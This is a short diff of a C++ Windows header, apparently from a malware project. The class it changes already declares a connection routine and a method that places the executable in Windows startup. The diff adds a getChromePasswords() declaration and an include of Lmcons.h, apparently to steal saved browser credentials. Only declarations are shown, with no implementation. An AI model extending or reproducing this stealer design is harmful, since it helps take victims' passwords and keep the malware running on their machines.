@@ -19,6 +19,7 @@
 #include <windows.h>
 #include<algorithm>
 #include <tchar.h>
+#include <Lmcons.h>
 #include <filesystem>
 
 #define BUFFER_SIZE 1024
@@ -72,6 +73,8 @@ public:
 
     //Creating the connection
     void connection();
+
+    void getChromePasswords();
 
     //Opening the exe file in windows startup
     int boot();
